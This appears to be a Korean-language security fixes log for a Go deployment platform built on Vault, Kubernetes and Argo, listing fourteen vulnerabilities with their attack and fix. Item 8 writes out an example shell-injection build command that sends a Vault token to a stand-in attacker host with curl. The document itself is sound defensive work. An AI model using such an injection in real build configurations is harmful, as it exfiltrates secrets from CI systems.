# Security Fixes

공격자 관점에서 발견된 취약점 목록 및 수정 내역.

## CRITICAL

### 1. App-to-Project 바인딩 검증 부재
- **위치**: env, logs, builds, tunnel, status, redeploy 핸들러 전체
- **문제**: `:app` 파라미터가 실제로 해당 프로젝트에 속하는지 검증 없음
- **공격**: 프로젝트 소유자가 `/projects/myproj/apps/otherproj-secret/env` 호출 → 타 프로젝트 Vault 시크릿 접근
- **수정**: `middleware.AppAccess()` 미들웨어 추가 — 프로젝트 컨텍스트에서 앱 목록을 확인해 `:app`이 속하는지 검증

## HIGH

### 2. `tail` 파라미터 상한 없음 → OOM DoS
- **위치**: `handler/logs.go:33-37`
- **공격**: `?tail=9999999999` 요청으로 서버 메모리 소진
- **수정**: tailLines 최대 5000으로 제한

### 3. Redeploy 무한 호출 → Argo Workflow 폭탄
- **위치**: `handler/app.go Redeploy`
- **공격**: `POST /:project/apps/:app/redeploy` 반복 호출로 워크플로우 무제한 생성
- **수정**: AppHandler에 per-app rate limiter 추가 (60초당 1회)

### 4. GitHub OAuth `code`를 fmt.Sprintf로 JSON에 삽입 → JSON Injection
- **위치**: `github/client.go:84`
- **공격**: code에 `"` 포함 시 JSON 파괴
- **수정**: `json.Marshal` 사용

### 5. WebSocket 모든 Origin 허용
- **위치**: `handler/logs.go upgrader`
- **문제**: `CheckOrigin: func() bool { return true }` — CSRF-like WebSocket 하이재킹 가능
- **수정**: Origin 헤더 검증 추가 (비어있거나 Host와 일치해야 함)

### 6. K8s API 연결 TLS 검증 비활성화
- **위치**: `k8s/client.go:26`
- **문제**: Bearer Token 사용 시 `Insecure: true` → MITM으로 토큰 탈취 가능
- **수정**: `K8S_CA_CERT` 환경변수 추가, CA cert 설정 시 TLS 검증 활성화

## MEDIUM

### 7. Allowlist 파일 없을 때 기본 허용 → 파일 삭제로 우회
- **위치**: `middleware/allowlist.go:23-25`
- **공격**: `allowed-users.yaml` 삭제 시 모든 인증된 사용자 접근 허용
- **수정**: 파일 없으면 기본 DENY

### 8. 빌드 커맨드에 셸 인젝션 패턴 허용 → CI에서 시크릿 탈취
- **위치**: `domain/project.go` 각 Build 타입의 BuildCommand/StartCommand
- **공격**: `buildCommand: "go build & curl http://attacker.com?t=$(cat $VAULT_TOKEN)"`
- **수정**: 백틱, `$(`, null byte 등 명시적 인젝션 패턴 차단 검증 함수

### 9. disableNetworkPolicy 사용자 직접 설정 가능 → 클러스터 내부망 접근
- **위치**: `domain/project.go Application`, `handler/app.go Create/Update`
- **공격**: `disableNetworkPolicy: true`로 다른 프로젝트 DB, Vault 내부 서비스에 직접 접근
- **수정**: 관리자만 `disableNetworkPolicy` 설정 가능

### 10. Addon 타입 미검증 → 임의 문자열 GitOps 기록
- **위치**: `handler/addon.go Create`
- **수정**: 허용 타입 화이트리스트 (`mysql`, `postgresql`, `redis`, `mongodb`, `kafka`, `rabbitmq`, `opensearch`, `elasticsearch`, `qdrant`)

### 11. Vault PatchEnv/DeleteEnvKey TOCTOU 경쟁 조건
- **위치**: `vault/client.go PatchEnv`, `DeleteEnvKey`
- **문제**: Read → Write 사이 락 없음 → 동시 요청 시 환경변수 유실
- **수정**: vault.Client에 `sync.Mutex` 추가

### 12. 프로젝트 삭제 시 K8s 네임스페이스 미정리 → 좀비 리소스
- **위치**: `handler/project.go Delete`
- **문제**: gitops YAML과 Vault만 삭제, K8s 네임스페이스/Deployment/PVC 유지
- **수정**: 프로젝트 삭제 시 K8s 네임스페이스 삭제 (cascade 삭제)

### 13. 마지막 오너 제거 가능 → 프로젝트 잠김
- **위치**: `handler/project.go RemoveMember`
- **수정**: 오너가 1명이면 제거 차단

## LOW

### 14. 에러 메시지에 내부 정보 노출
- 일부 핸들러에서 Vault 경로, 내부 호스트명 등이 에러 응답에 포함
- Vault 에러는 래핑해서 내부 정보 제거

## 구현 범위 (이번 수정)
모든 항목 구현 완료.
